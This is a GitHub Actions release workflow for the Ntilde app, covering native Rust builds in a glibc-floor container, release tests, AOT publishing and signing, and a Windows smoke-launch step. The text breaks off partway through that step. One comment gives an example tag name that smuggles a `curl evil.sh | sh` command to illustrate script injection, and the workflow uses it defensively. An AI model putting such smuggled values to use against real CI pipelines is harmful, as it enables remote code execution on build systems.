name: Release

on:
  push:
    tags:
      - "v*"
  workflow_dispatch:
    inputs:
      tag_name:
        description: "Release tag to publish (for example v0.1.1)"
        required: true
        type: string
      target_commitish:
        description: "Branch, tag, or commit to build when dispatching manually"
        required: false
        default: "main"
        type: string

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

env:
  DOTNET_NOLOGO: true
  DOTNET_CLI_TELEMETRY_OPTOUT: true
  CONFIGURATION: Release
  # Same daemon hygiene as ci.yml / scripts/build.* — see CLAUDE.md: without these,
  # MSBuild worker nodes and the build server outlive the step and hang the runner
  # when stdout is captured.
  DOTNET_CLI_USE_MSBUILD_SERVER: 0
  MSBUILDDISABLENODEREUSE: 1

jobs:
  release_metadata:
    name: Resolve Release Metadata
    runs-on: ubuntu-latest
    # Every job declares its own permissions (githubactions:S8233): there is no
    # workflow-level default, so each GITHUB_TOKEN states exactly what it may do.
    permissions:
      contents: read
    outputs:
      release_tag: ${{ steps.meta.outputs.release_tag }}
      release_version: ${{ steps.meta.outputs.release_version }}
      checkout_ref: ${{ steps.meta.outputs.checkout_ref }}
      # Whether the code this run builds may WRITE the caches it restores. Every
      # cache step in this workflow is gated on it - see the note in `meta` below.
      cache_trusted: ${{ steps.meta.outputs.cache_trusted }}
    steps:
      - name: Resolve tag and checkout ref
        id: meta
        shell: bash
        # Every ${{ }} value reaches the script through env, never interpolated into it.
        # workflow_dispatch inputs are supplied by whoever triggers the run, and a tag or
        # branch name can itself contain shell metacharacters, so interpolating either
        # directly into a run block is a script-injection hole (a tag named
        # `v1.0.0"; curl evil.sh | sh; #` would execute). Through env the value is only
        # ever data. Flagged as githubactions:S7630.
        env:
          EVENT_NAME: ${{ github.event_name }}
          PUSH_REF_NAME: ${{ github.ref_name }}
          PUSH_REF: ${{ github.ref }}
          INPUT_TAG_NAME: ${{ inputs.tag_name }}
          INPUT_TARGET_COMMITISH: ${{ inputs.target_commitish }}
          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
        run: |
          if [[ "$EVENT_NAME" == "push" ]]; then
            tag="$PUSH_REF_NAME"
            echo "checkout_ref=$PUSH_REF" >> "$GITHUB_OUTPUT"
            # A tag push builds that tag and writes the cache under that tag's own
            # scope, so the code and the scope are the same thing.
            trusted=true
          else
            tag="$INPUT_TAG_NAME"
            echo "checkout_ref=$INPUT_TARGET_COMMITISH" >> "$GITHUB_OUTPUT"
            # A workflow_dispatch runs - and therefore caches - in the context of the
            # ref it was dispatched from, normally the default branch, while
            # target_commitish chooses the code to build. Building anything else there
            # would let that code write the default branch's cache, which a later
            # legitimate run would then restore: cache poisoning
            # (CodeQL actions/cache-poisoning/poisonable-step). Dispatching against the
            # default branch itself is the trusted case and keeps its cache.
            if [[ "$INPUT_TARGET_COMMITISH" == "$DEFAULT_BRANCH" ]]; then
              trusted=true
            else
              trusted=false
            fi
          fi
          echo "cache_trusted=$trusted" >> "$GITHUB_OUTPUT"
          echo "release_tag=$tag" >> "$GITHUB_OUTPUT"
          # Velopack versions are SemVer without a leading 'v'; the tag has one.
          echo "release_version=${tag#v}" >> "$GITHUB_OUTPUT"

  create_release:
    name: Create Release
    runs-on: ubuntu-latest
    needs: [release_metadata]
    permissions:
      contents: write
    steps:
      - name: Create or update release
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
        with:
          tag_name: ${{ needs.release_metadata.outputs.release_tag }}
          # THE TAG MUST LAND ON THE COMMIT BEING BUILT. Without this the input is
          # `undefined` (the action does `env.INPUT_TARGET_COMMITISH || undefined`
          # and passes it straight through with no fallback), and the GitHub API
          # then defaults to the REPOSITORY'S DEFAULT BRANCH. So a dispatch with
          # target_commitish set to anything other than main - the documented
          # recovery path, "dispatch with tag_name set from an updated branch" -
          # built that branch while creating the tag on main's head. Every asset
          # came from one commit and the tag named another.
          #
          # Safe on a tag push under either reading of the `inputs` context. If it
          # is empty there (it is: `inputs` is populated only for workflow_dispatch
          # and workflow_call), this is `''` and the behaviour is unchanged. If it
          # somehow carried the "main" default, the tag already exists on a tag
          # push and the API documents target_commitish as "unused if the Git tag
          # already exists". Neither path can move an existing tag.
          #
          # NOT the same thing as release_metadata's checkout_ref, deliberately:
          # that is `refs/tags/vX` on a push, which is not a commitish you can
          # create a tag from.
          target_commitish: ${{ inputs.target_commitish }}
          generate_release_notes: true
          # A SemVer tag's only legal use of '-' is the prerelease separator, so
          # contains('-') is a sound test for "v0.5.0-beta.1 is not a stable release".
          #
          # This flag is load-bearing for the update feed, not cosmetic. Velopack's
          # GithubSource(repoUrl, token, prerelease: false) filters on GitHub's own
          # `prerelease` FLAG (GetReleases does `.Where(x => includePrereleases ||
          # !x.Prerelease)`) - it never inspects the SemVer suffix. And
          # UpdateManager.CheckForUpdatesAsync does no prerelease filtering of its own
          # either: it is a bare `feed.Where(Full).MaxBy(x => x.Version)`. So without
          # this line a beta tag publishes as a NORMAL release, 0.5.0-beta.1 sorts above
          # 0.4.0, and every installed stable user gets pulled onto the beta. Same story
          # for `vpk download github`, which filters on the identical flag.
          prerelease: ${{ contains(needs.release_metadata.outputs.release_tag, '-') }}

  build_native:
    name: Build Native (${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    timeout-minutes: 20
    needs: [release_metadata]
    permissions:
      contents: read
    strategy:
      fail-fast: false
      matrix:
        # Linux is deliberately NOT in this matrix - see build_native_linux below.
        # librusty_pty.so / librusty_ssh.so SHIP INSIDE the bundle, so they are
        # subject to the same glibc floor as the AOT binary and must be built in the
        # ubuntu:22.04 container rather than on whatever glibc the hosted runner
        # happens to carry. Building them here on ubuntu-latest (24.04, glibc 2.39)
        # is what made the shipped Linux bundle refuse to start on Ubuntu 22.04 and
        # Debian 12 - the .so would have been the failing link even if the AOT binary
        # itself were fixed. The artifact NAME is unchanged (native-ubuntu-latest),
        # so release_tests and every other consumer needs no edit.
        os: [windows-latest, macos-latest]

    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ needs.release_metadata.outputs.checkout_ref }}

      - name: Install Rust
        # Pinned to a full commit SHA (githubactions:S7637); the stable branch
        # still resolves the latest stable toolchain at run time.
        uses: dtolnay/rust-toolchain@6bed0761d98439e5a578e2877258200ad565ba87 # stable

      - name: Rust Cache
        if: needs.release_metadata.outputs.cache_trusted == 'true'
        uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
        with:
          workspaces: src/Ntilde.App/native

      - name: Build Rust (Windows)
        if: matrix.os == 'windows-latest'
        run: |
          cd src/Ntilde.App/native
          cargo build --release --locked
          cd rusty_ssh
          cargo build --release --locked

      - name: Build Rust (macOS)
        if: matrix.os == 'macos-latest'
        run: |
          cd src/Ntilde.App/native
          cargo build --release --locked
          cd rusty_ssh
          cargo build --release --locked

      - name: Upload Native Artifact
        uses: actions/upload-artifact@v4
        with:
          name: native-${{ matrix.os }}
          path: |
            src/Ntilde.App/native/target*/**/release/*pty.*
            src/Ntilde.App/native/rusty_ssh/target*/**/release/*ssh.*

  # ===========================================================================
  # Linux native libraries, built on the glibc floor. Split out of build_native
  # because it needs `container:` and Windows/macOS must not have one.
  #
  # WHY A CONTAINER RATHER THAN `runs-on: ubuntu-22.04`. NativeAOT and cdylib
  # crates alike link against the BUILD machine's glibc with no runtime fallback,
  # so whatever builds them IS the minimum supported distro. Pinning that with a
  # runner label was the original plan, but actions/runner-images#14254 deprecates
  # the ubuntu-22.04 image from 2026-09-17 (fully unsupported 2027-04-17) and
  # ubuntu-22.04-arm inherits the same date - so the floor would have retired on
  # GitHub's schedule instead of ours. `runs-on: ubuntu-latest` (x64) /
  # `ubuntu-24.04-arm` (arm64) plus `container: ubuntu:22.04` pins glibc 2.35
  # (Ubuntu 22.04+, Debian 12+, Fedora 36+) to an image tag we control. Bumping the
  # floor is now a deliberate two-line edit (here and in publish_linux).
  #
  # This mirrors ci.yml's linux_packaging_build container recipe, which is the
  # version actually proven end-to-end in ubuntu:22.04. Read that job's comments
  # before changing anything here; each line of the recipe is a silent-failure trap
  # somebody already found (checkout degrading to a REST tarball without git,
  # actions/cache degrading without zstd, dotnet-install drifting off global.json,
  # dtolnay/rust-toolchain needing a rustup the bare image lacks, $HOME being
  # /github/home rather than /root, and no sudo).
  # ===========================================================================
  build_native_linux:
    name: Build Native Linux (${{ matrix.rid }})
    runs-on: ${{ matrix.os }}
    container:
      image: ubuntu:22.04
    # A `container:` job does NOT get bash as its default shell the way a plain
    # runner does - GitHub runs its inline `run:` blocks under `sh` (dash on this
    # image), and dash has no `pipefail` option, no `<<<`, no `[[`. Every step
    # below uses one or both. See ci.yml's linux_packaging_build for the CI run
    # that surfaced this the hard way.
    defaults:
      run:
        shell: bash
    # 20 -> 40: the container starts from nothing, so every run pays an apt install
    # and a rustup bootstrap on top of the two cargo builds that used to run against
    # a warm, fully preinstalled runner image.
    timeout-minutes: 40
    needs: [release_metadata]
    permissions:
      contents: read
    # ARM64 GATES LIKE EVERY OTHER PLATFORM NOW - no more `continue-on-error` here.
    # `fail-fast: false` below still stops a red arm64 leg cancelling its x64
    # sibling, but a JOB failure still propagates: release_tests `needs:
    # build_native_linux`, and publish_aot `needs: release_tests`. So a genuine
    # arm64 native-build failure once again skips release_tests, skips
    # publish_aot, and withholds Windows and macOS assets along with Linux's -
    # exactly like every other platform's leg, and exactly what the removed line
    # used to prevent.
    #
    # THIS WAS TOLERATED, NOT PERMANENT. The line it replaced read: "once this leg
    # has been green on a real tag, delete this line." v0.7.0-rc.1 (release run
    # 33740981976) was that tag: every job in the arm64 chain - this one, Release
    # Tests (ubuntu-24.04-arm), Publish Linux (linux-arm64), Release Linux
    # (linux-arm64) - finished green, AND the arm64 assets genuinely published
    # (ntilde-linux-arm64-v0.7.0-rc.1.AppImage,
    # ntilde_0.7.0.rc.1-1_arm64.deb,
    # NtildeApp-0.7.0-rc.1-linux-arm64-full.nupkg,
    # releases.linux-arm64.json), which is proof a merely-green-but-tolerant job
    # cannot offer on its own. That answered every unknown this leg carried: vpk
    # runs on linux-arm64, ubuntu-24.04-arm provides a docker daemon and a
    # /dev/fuse node, and the arm64 NativeAOT publish works inside the
    # ubuntu:22.04 container.
    #
    # THIS IS NOW A DELIBERATE, ACCEPTED TRADE, not an oversight: a real Linux
    # native failure can once again withhold Windows and macOS assets, which is
    # the whole reason this line existed in the first place. The coupling itself
    # (build_native_linux -> release_tests -> publish_aot) has not changed - only
    # the tolerance for an unproven arm64 leg is gone.
    #
    # RECOVERY if arm64 ever regresses badly enough to need decoupling again is
    # NOT "re-run failed jobs": a GitHub re-run replays the workflow file as of
    # the triggering ref, so an edit made on main afterward (re-adding
    # `continue-on-error`, or removing arm64 from the matrix) has no effect on
    # that run. It requires either a new tag cut from the fixed commit, or
    # `workflow_dispatch` with `tag_name` set to the existing tag, which reads the
    # workflow from the current default branch.
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: ubuntu-latest
            rid: linux-x64
          # ubuntu-24.04-arm, NOT ubuntu-22.04-arm: same September 2026 deprecation
          # as the x64 image. The CONTAINER is still ubuntu:22.04 on both legs, so
          # the glibc floor is identical across architectures and independent of the
          # runner label. `ubuntu:22.04` is a multi-arch manifest, so this pulls the
          # arm64 variant here.
          #
          # PROVEN on v0.7.0-rc.1 (release run 33740981976): this leg built for
          # real on aarch64 inside the ubuntu:22.04 container and its assets
          # published. Before that tag it had never run anywhere - this repo's own
          # development machine included, which has no arm64 emulation.
          - os: ubuntu-24.04-arm
            rid: linux-arm64
    steps:
      # MUST precede actions/checkout: a bare ubuntu:22.04 has no git, and
      # actions/checkout silently falls back to a REST tarball download when git is
      # absent - producing no `.git` at all.
      #
      # This list is deliberately IDENTICAL to publish_linux's below (and to
      # ci.yml's, plus jq, which only publish_linux uses). Two nearly-identical
      # lists that drift apart is a worse failure mode than a few seconds of apt
      # installing packages this particular job does not use, because the drift
      # shows up as a silently different .deb Depends: set rather than as an error.
      # Per-package rationale lives in ci.yml's linux_packaging_build.
      - name: Install container toolchain
        run: |
          set -euo pipefail
          export DEBIAN_FRONTEND=noninteractive
          apt-get update
          apt-get install -y \
            ca-certificates curl git unzip zstd jq \
            clang zlib1g-dev binutils file imagemagick squashfs-tools \
            fontconfig libfreetype6 x11-utils \
            libicu70 libssl3
          echo "--- container identity (the glibc floor this lane pins) ---"
          head -2 /etc/os-release
          # Captured, not piped into `head`: ldd's version script emits its
          # lines via separate writes, so `| head -1` can close the pipe
          # while ldd is still writing and take SIGPIPE under `pipefail` -
          # the exact hazard ci.yml's identical diagnostic hit in CI run
          # 33669171961. sed selects line 1 from the already-complete string,
          # with nothing left upstream to starve.
          sed -n '1p' <<<"$(ldd --version)"
          # `cc` is what rustc invokes as its linker driver for *-unknown-linux-gnu.
          # It is not installed directly - it arrives as an alternative through
          # clang's dependency chain - so assert it rather than assume it.
          command -v cc

      - uses: actions/checkout@v4
        with:
          ref: ${{ needs.release_metadata.outputs.checkout_ref }}

      # dtolnay/rust-toolchain@stable drives an EXISTING rustup, which the hosted
      # runner image preinstalls and a bare ubuntu:22.04 does not. Same intent, via
      # the upstream installer.
      #
      # The upstream installer is NOT invoked as `curl https://sh.rustup.rs | sh`,
      # though: this job's output ships as a release artifact end users install,
      # and a release pipeline should not execute an unverified script fetched
      # through a redirector. Instead: download a version-pinned rustup-init for
      # this container's own architecture, verify it against rustup's published
      # SHA256 before executing anything, then run the verified binary.
      # RUSTUP_VERSION is pinned in a variable (not buried in a URL) so the pin
      # is visible and trivial to bump. `uname -m` maps directly onto the
      # "<arch>-unknown-linux-gnu" triple name for both x86_64 and aarch64, so
      # no per-arch branch is needed - this runs unchanged on the
      # ubuntu-24.04-arm leg.
      - name: Install Rust
        run: |
          set -euo pipefail
          RUSTUP_VERSION=1.29.1
          triple="$(uname -m)-unknown-linux-gnu"
          base_url="https://static.rust-lang.org/rustup/archive/${RUSTUP_VERSION}/${triple}"
          curl --proto '=https' --tlsv1.2 -sSf -o /tmp/rustup-init "${base_url}/rustup-init"
          curl --proto '=https' --tlsv1.2 -sSf -o /tmp/rustup-init.sha256 "${base_url}/rustup-init.sha256"
          (cd /tmp && sha256sum -c rustup-init.sha256)
          chmod +x /tmp/rustup-init
          /tmp/rustup-init -y --default-toolchain stable --profile minimal
          echo "$HOME/.cargo/bin" >> "$GITHUB_PATH"

      - name: Verify cargo is on PATH
        run: |
          set -euo pipefail
          command -v cargo
          cargo --version
          rustc --version

      # A node action, so it runs inside the container, and it only needs cargo on
      # PATH - which the step above put there via $GITHUB_PATH. Keyed per runner
      # architecture by rust-cache's own job/target hashing.
      - name: Rust Cache
        if: needs.release_metadata.outputs.cache_trusted == 'true'
        uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
        with:
          workspaces: src/Ntilde.App/native

      # target_linux/ is an arch-agnostic staging directory and each leg builds
      # natively for its own runner, so no --target and no arch branch is needed.
      # The artifacts stay distinct because they are named per runner OS below.
      - name: Build Rust (Linux)
        run: |
          set -euo pipefail
          cd src/Ntilde.App/native
          cargo build --release --locked
          mkdir -p target_linux/release
          cp target/release/librusty_pty.so target_linux/release/
          cd rusty_ssh
          cargo build --release --locked

      # native-${{ matrix.os }}, exactly the name build_native used to publish for
      # its ubuntu-latest leg, so release_tests and publish_linux download it
      # without knowing which job produced it.
      - name: Upload Native Artifact
        uses: actions/upload-artifact@v4
        with:
          name: native-${{ matrix.os }}
          path: |
            src/Ntilde.App/native/target*/**/release/*pty.*
            src/Ntilde.App/native/rusty_ssh/target*/**/release/*ssh.*

  # Release gate (#156): releases used to publish AOT bundles without running a
  # single test. Run the same deterministic unit lane that gates PRs in ci.yml —
  # on all three release OSes, which also gives macOS its only automated test
  # coverage — before any bundle is published.
  #
  # DELIBERATELY NOT CONTAINERISED, unlike build_native_linux and publish_linux.
  # This job is the one place in the Linux lane where the glibc floor is NOT
  # enforced, so the reasoning is recorded rather than left implicit:
  #
  #   - Nothing this job produces ships. It runs `dotnet test` against a RID-less,
  #     framework-dependent build; the shipped artifact is a self-contained AOT
  #     binary that this job never builds, links, or executes. The floor is a
  #     LINK-time property of the AOT binary and the Rust cdylibs, and both of those
  #     are produced under the container by the jobs that do ship them.
  #   - The native libraries under test here ARE the container-built ones
  #     (native-${{ matrix.os }} comes from build_native_linux), so the artifacts
  #     being exercised are the shipping artifacts even though the host glibc is
  #     newer. glibc is forward compatible, so a 2.35-linked .so loads fine on 2.39.
  #   - Containerising would cost a ~220 MB SDK download per leg and, more
  #     importantly, run the gating Rendering tests inside an image with no fonts
  #     and no fontconfig data - a known source of Linux font drift in this repo.
  #     That trades a theoretical glibc signal for a likely false red on the release
  #     lane, which is the worst possible place for one.
  #
  # WHAT THAT GIVES UP, stated plainly: a runtime regression that reproduces only on
  # glibc 2.35 and not on 2.39 would not be caught by these tests. The compensating
  # control is real but narrower - publish_linux's smoke gate launches the actual
  # shipped bundle inside a pristine ubuntu:22.04 container, which is where the floor
  # is genuinely exercised. If that ever proves insufficient, the fix is to add a
  # containerised leg here, not to weaken the smoke gate.
  release_tests:
    name: Release Tests (${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    timeout-minutes: 30
    # build_native_linux as well as build_native: the ubuntu legs' native-* artifacts
    # now come from that job, so needing only build_native would race the download.
    needs: [release_metadata, build_native, build_native_linux]
    permissions:
      contents: read
    # ARM64 GATES LIKE EVERY OTHER PLATFORM NOW - no more `continue-on-error`
    # here. `fail-fast: true` below still means a failing leg CANCELS its
    # in-flight siblings, and every publish job needs this one - so a red
    # ubuntu-24.04-arm leg once again cancels the Windows and macOS legs mid-run,
    # skips publish_aot, and withholds Windows and macOS assets along with
    # Linux's. This leg runs Ntilde.Rendering.Tests - the project with this
    # repo's documented Linux font/Skia drift - so that risk is real, not
    # theoretical; it is accepted now (see below), not gone.
    #
    # THIS WAS TOLERATED, NOT PERMANENT. The line it replaced read: "once this leg
    # has been green on a real tag, delete this line." v0.7.0-rc.1 (release run
    # 33740981976) was that tag: this leg, and the whole arm64 chain around it
    # (Build Native Linux (linux-arm64), Publish Linux (linux-arm64), Release
    # Linux (linux-arm64)), finished green, and the arm64 release assets
    # genuinely published - proof a merely-green-but-tolerant job cannot offer on
    # its own.
    #
    # THIS IS NOW A DELIBERATE, ACCEPTED TRADE, not an oversight: #156's test gate
    # is once again a real gate for arm64, at the cost that an uncharacterised
    # architecture's test failure can withhold two shipping platforms' assets.
    # That is the same bargain every other platform's leg already makes, and it
    # is only acceptable because the lane is now proven rather than merely
    # designed.
    #
    # RECOVERY if arm64 ever regresses badly enough to need decoupling again is
    # NOT "re-run failed jobs": a GitHub re-run replays the workflow file as of
    # the triggering ref, so an edit made on main afterward (re-adding
    # `continue-on-error`, or removing arm64 from the matrix) has no effect on
    # that run. It requires either a new tag cut from the fixed commit, or
    # `workflow_dispatch` with `tag_name` set to the existing tag, which reads the
    # workflow from the current default branch.
    strategy:
      fail-fast: true
      matrix:
        # ubuntu-24.04-arm is the arm64 test leg. It exists because publish_linux
        # ships an arm64 bundle, and #156 - the reason this job exists at all - was
        # precisely that releases published bundles no test had ever touched;
        # shipping a whole new architecture untested would reopen that hole for
        # arm64. PROVEN on v0.7.0-rc.1 (release run 33740981976): this leg ran and
        # went green for real, on a tag with published arm64 assets to show for it.
        os: [windows-latest, ubuntu-latest, macos-latest, ubuntu-24.04-arm]

    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ needs.release_metadata.outputs.checkout_ref }}

      - name: Setup .NET
        uses: actions/setup-dotnet@v4
        with:
          global-json-file: global.json

      - name: Download Native Artifact
        uses: actions/download-artifact@v4
        with:
          name: native-${{ matrix.os }}
          path: src/Ntilde.App/native

      - name: Restore
        run: dotnet restore

      - name: Build
        env:
          SKIP_RUST_NATIVE_BUILD: "1"
        run: dotnet build -c ${{ env.CONFIGURATION }} --no-restore

      # Mirrors the gating unit lane in ci.yml (same projects, same filter).
      - name: Test (unit — gating, non-headless projects)
        env:
          SKIP_RUST_NATIVE_BUILD: "1"
        shell: bash
        run: |
          set -e
          filter="Category!=Replay&Category!=RenderMetrics&Category!=PtySmoke&Category!=Stress&Category!=GoldenSharedPng"
          for proj in VT Rendering Architecture Platform McpServer; do
            echo "::group::Ntilde.$proj.Tests"
            dotnet test "tests/Ntilde.$proj.Tests" -c "$CONFIGURATION" --no-build --no-restore \
              --filter "$filter" --logger "trx;LogFileName=release_${proj}.trx"
            echo "::endgroup::"
          done

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: release-tests-${{ matrix.os }}
          retention-days: 5
          path: "**/*.trx"

  publish_aot:
    name: Publish AOT (${{ matrix.rid }})
    runs-on: ${{ matrix.os }}
    # 90 rather than 40: the signed mac lane waits synchronously on Apple's
    # notarization queue inside vpk pack, which alone can run 10-30+ minutes on a
    # slow day — 40 was cutting the job down mid-wait.
    timeout-minutes: 90
    needs: [release_metadata, create_release, build_native, release_tests]
    permissions:
      contents: write
    strategy:
      fail-fast: false
      matrix:
        # linux-x64 has moved to publish_linux, and linux-arm64 is new there. It
        # cannot live in this matrix: its build needs `container: ubuntu:22.04` (the
        # glibc floor) while Windows and macOS must not have a container, and its
        # release gate needs a docker daemon, which a `container:` job does not have.
        # This job's Windows and macOS behaviour - assets, channels, delta feeds,
        # signing, notarization - is unchanged.
        include:
          - os: windows-latest
            rid: win-x64
          - os: macos-latest
            rid: osx-arm64

    # The secrets context is not allowed in step-level `if` (the workflow fails to
    # parse), so the signing gate is materialized here as an env boolean the macOS
    # keychain step can test.
    env:
      MAC_SIGNING_ENABLED: ${{ secrets.MAC_CERT_P12_BASE64 != '' }}

    steps:
      # ---- macOS signing setup precedes the checkout_ref checkout on purpose: that
      # ---- ref (the dispatch input target_commitish) can name a revision older than
      # ---- the workflow's own ref, and the local action below resolves from the
      # ---- workspace tree — which such a revision would not contain (Greptile P1 on
      # ---- #382). So: check the workflow's own ref out first (it provides the
      # ---- action), import the keychain + notarytool profile (both live outside the
      # ---- workspace, so the re-checkout's clean cannot disturb them), then check
      # ---- out the release revision the build actually packages. Gated like the
      # ---- keychain step, so the unsigned lane keeps a single checkout.
      - name: Checkout workflow ref (provides the local signing action)
        if: matrix.rid == 'osx-arm64' && env.MAC_SIGNING_ENABLED == 'true'
        uses: actions/checkout@v4

      - name: Set up macOS signing keychain
        id: mac_signing
        if: matrix.rid == 'osx-arm64' && env.MAC_SIGNING_ENABLED == 'true'
        uses: ./.github/actions/setup-mac-signing
        with:
          cert-p12-base64: ${{ secrets.MAC_CERT_P12_BASE64 }}
          installer-p12-base64: ${{ secrets.MAC_INSTALLER_CERT_P12_BASE64 }}
          cert-password: ${{ secrets.MAC_CERT_PASSWORD }}
          sign-app-identity: ${{ secrets.MAC_SIGN_APP_IDENTITY }}
          sign-install-identity: ${{ secrets.MAC_SIGN_INSTALL_IDENTITY }}
          notary-profile: ${{ secrets.MAC_NOTARY_PROFILE }}
          apple-id: ${{ secrets.MAC_APPLE_ID }}
          team-id: ${{ secrets.MAC_TEAM_ID }}
          app-specific-password: ${{ secrets.MAC_APP_SPECIFIC_PASSWORD }}

      - uses: actions/checkout@v4
        with:
          ref: ${{ needs.release_metadata.outputs.checkout_ref }}

      - name: Setup .NET
        uses: actions/setup-dotnet@v4
        with:
          global-json-file: global.json

      - name: Download Native Artifact
        uses: actions/download-artifact@v4
        with:
          name: native-${{ matrix.os }}
          path: src/Ntilde.App/native

      - name: Restore
        run: dotnet restore

      - name: Publish AOT
        # RELEASE_VERSION through env for the same reason as every other run block in this
        # file: it derives from a tag or a workflow_dispatch input, so interpolating it into
        # script source is a command-injection path — on all three runners here, bash and
        # pwsh alike. $(...) executes in both. env.CONFIGURATION and matrix.rid are literals
        # from this workflow file, not user input, so they stay inline. (Codex P1 on #340.)
        #
        # shell: bash is explicit because this step runs on all three OSes and env-var syntax
        # is not portable ($VAR in bash, $env:VAR in pwsh, which is the default shell on the
        # Windows runner). bash is present on every GitHub-hosted runner, and the release_tests
        # job already runs a bash step on windows-latest, so this is the file's own precedent.
        shell: bash
        env:
          SKIP_RUST_NATIVE_BUILD: "1"
          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
        run: dotnet publish src/Ntilde.App/Ntilde.App.csproj -c ${{ env.CONFIGURATION }} -r ${{ matrix.rid }} --self-contained true -p:PublishAot=true -p:SkipCliShim=true "-p:Version=$RELEASE_VERSION" "-p:InformationalVersion=$RELEASE_VERSION" -o artifacts/publish/${{ matrix.rid }}

      # ---- BLOCKING release gate for the Windows bundle, and deliberately placed here:
      # ---- everything below (Archive bundle, Upload release asset, vpk pack, Upload
      # ---- installer) is downstream, so a bundle that cannot start never reaches the
      # ---- release page or the update feed.
      #
      # WHY THIS EXISTS. Until now nothing ever started the Windows bundle. Linux has had a
      # blocking smoke gate since #91 (packaging/linux/smoke-test.sh, in pristine docker
      # containers); Windows went compiler -> zip -> release page with no execution in
      # between. #443 is what that costs: a NativeAOT trimming break renders blank instead
      # of throwing, so it survives every dev build and every test - all JIT, full metadata -
      # and ships. ci.yml's AOT Gate now catches that shape pre-merge, but a PR gate cannot
      # protect a tag: this job publishes with -p:Version, downloads prebuilt native
      # artifacts it did not compile, and runs on a different commit than any PR did.
      #
      # THE NATIVES ARE THE ADDED VALUE OVER ci.yml. `Download Native Artifact` above puts
      # rusty_pty/rusty_ssh here from a separate job, with SKIP_RUST_NATIVE_BUILD=1 - so this
      # is the only place that proves the *shipped* combination of managed bundle and
      # downloaded natives actually loads. The `Spawned ... pid=` assertion below is what
      # exercises them: no working PTY, no spawn line, red gate.
      #
      # NTILDE_APPDATA_ROOT points the app at an empty directory, so it starts from a
      # pristine profile - no settings.json, no themes, no session to restore. That is the
      # state a new install is in, and #443 was reported from exactly there.
      #
      # WHAT IT DOES NOT COVER, so nobody reads more into a green run than is there: it
      # opens no palette, no settings window and no dialog. It proves the bundle starts and
      # brings up its terminal UI. The command palette's own class of bug is guarded by
      # WarningsAsErrors=IL2026;IL3050 in Ntilde.App.csproj (which makes the publish
      # step above fail outright) and by CompiledBindingTests.
      #
      # IF THIS GOES RED ON A TAG. Do not disable it to get the release out; that reinstates
      # the exact hole #443 shipped through. Read the log it prints, which distinguishes a
      # startup exception from a silent exit from a UI that never finished coming up.
      - name: Smoke launch the Windows bundle (blocking)
        if: matrix.rid == 'win-x64'
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $root = Join-Path $env:RUNNER_TEMP 'ntilde-release-smoke-profile'
          New-Item -ItemType Directory -Force -Path $root | Out-Null
          $env:NTILDE_APPDATA_ROOT = $root
          $errorFile = Join-Path $root 'logs/startup_error.txt'
          $debugLog  = Join-Path $root 'logs/debug.log'

          $exe = Join-Path $PWD 'artifacts/publish/win-x64/Ntilde.exe'
          if (-not (Test-Path $exe)) { throw "The publish produced no Ntilde.exe at $exe." }

          $proc = Start-Process -FilePath $exe -PassThru
          Write-Output "Started pid $($proc.Id); watching for 45s."

          # Poll rather than sleep-then-look, so a fast crash is reported as a crash instead
          # of waiting out the full window first.
          $deadline = (Get-Date).AddSeconds(45)
          while ((Get-Date) -lt $deadline) {
            if ($proc.HasExited -or (Test-Path $errorFile)) { break }
            Start-Sleep -Seconds 2
          }

          # Diagnostics BEFORE the assertions: on a tag build this log is the whole
          # diagnosis, and an assertion that throws first would take it away.
          foreach ($f in @($debugLog, $errorFile)) {
            if (Test-Path $f) {
              Write-Output "---- $f ----"
              Get-Content $f -Tail 60
            }
          }

          if (Test-Path $errorFile) {
            throw "The bundle failed during startup and wrote startup_error.txt (contents above). A trimmed-away type or a native that will not load is a real break in the artifact about to be released - do not retry it away."
          }
          if ($proc.HasExited) {
            throw "The bundle exited on its own within 45s (exit code $($proc.ExitCode)) without writing startup_error.txt, so it died outside Program.cs's own try/catch - suspect the native side or the host."
          }
          if (-not (Test-Path $debugLog)) {
            throw "The process is alive but never wrote $debugLog, so managed Main did not reach its startup logging. Suspect a failure before the log sink is wired, in the AOT host itself."
          }

          # Asserts on the THIRD line Program.cs logs at startup, not the first: the first
          # ("Ntilde started with args: ...") never reaches the file, on any machine, so
          # the obvious assertion is a guaranteed false failure. Build: is the better anchor
          # anyway - it proves managed Main got through startup AND that DescribeBuild
          # resolved the executable path, the one remaining IL3000 in the tree.
          if (-not (Select-String -Path $debugLog -Pattern 'Build:.*path=.*Ntilde\.exe' -Quiet)) {
            throw "$debugLog carries no 'Build: ... path=...Ntilde.exe' line. Either managed Main did not reach its startup logging, or DescribeBuild could not resolve the executable path - which in an AOT bundle means Environment.ProcessPath came back empty and the Assembly.Location fallback (IL3000) was reached after all."
          }

          # Beyond "Main ran": the window and a terminal view came up, and the downloaded
          # native PTY loaded and spawned a shell with a live child. Both lines are emitted on
          # a pristine profile. If a log reword breaks this, re-anchor to whatever the renderer
          # and the PTY now say on first paint - do not delete the check, or this step goes
          # back to proving only that a process launched, which #443 also did.
          #
          # `Spawned ... pid=<n>`, NOT the `Spawning` line this step first shipped with:
          # RustPtySession logs `Spawning` BEFORE calling pty_spawn, so a rusty_pty that is
          # missing, ABI-incompatible, or simply unable to spawn writes it and then throws
          # into TerminalPane.InitializeSessionCore's catch, which shows an error banner and
          # leaves the process alive and themed. Every assertion in this step would pass and
          # the PTY-less bundle would be published - the precise failure this gate exists to
          # stop, since this job's natives come from `Download Native Artifact` and are never
          # compiled or run anywhere else. `Spawned` sits after the IsInvalid check and carries
          # the child pid, so it cannot be reached without a working native. (Codex P1 on #445.)
          foreach ($pattern in @('\[TerminalView\] Theme applied', '\[RustPtySession\] Spawned .*pid=\d+')) {
            if (-not (Select-String -Path $debugLog -Pattern $pattern -Quiet)) {
